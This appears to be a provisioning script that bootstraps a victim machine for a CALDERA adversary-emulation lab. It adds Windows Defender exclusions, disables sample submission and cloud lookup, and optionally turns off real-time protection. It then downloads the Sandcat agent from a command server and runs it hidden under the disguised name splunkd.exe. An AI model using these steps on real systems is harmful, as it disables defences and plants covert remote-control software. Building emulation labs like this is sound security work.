<powershell>
# ============================================================
#  CALDERA victim bootstrap (runs once at first boot as SYSTEM)
# ============================================================
$ErrorActionPreference = "Continue"
$pub = "C:\Users\Public"
$agentPath = "$pub\splunkd.exe"   # disguised name CALDERA's sandcat uses by default

# --- 1. Windows Defender: stop quarantining the agent ---------
# Targeted exclusions (these usually work even with Tamper Protection on):
Add-MpPreference -ExclusionPath $pub          -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $agentPath    -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "splunkd.exe" -ErrorAction SilentlyContinue
Set-MpPreference  -SubmitSamplesConsent 2     -ErrorAction SilentlyContinue   # never send samples
Set-MpPreference  -MAPSReporting 0            -ErrorAction SilentlyContinue   # disable cloud lookup
%{ if disable_rtp ~}
# Optional hard-off (may be blocked by Tamper Protection on fresh AMIs):
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection      $true -ErrorAction SilentlyContinue
%{ endif ~}

# --- 2. Download & launch the CALDERA Sandcat agent -----------
# Retries so boot order doesn't matter: the server may still be building.
$server = "${caldera_server}"
$group  = "${agent_group}"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$deployed = $false
for ($i = 1; $i -le 60; $i++) {   # up to 60 * 30s = 30 min
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.add("platform","windows")
        $wc.Headers.add("file","sandcat.go")
        $data = $wc.DownloadData("$server/file/download")
        [io.file]::WriteAllBytes($agentPath, $data)

        Start-Process -FilePath $agentPath `
            -ArgumentList "-server $server -group $group -v" `
            -WindowStyle hidden

        Write-Output "sandcat deployed (attempt $i) -> $server (group=$group)"
        $deployed = $true
        break
    } catch {
        Write-Output "attempt $i failed: $($_.Exception.Message); retrying in 30s"
        Start-Sleep -Seconds 30
    }
}
if (-not $deployed) { Write-Output "sandcat deploy gave up after 30 min" }
</powershell>
<persist>false</persist>
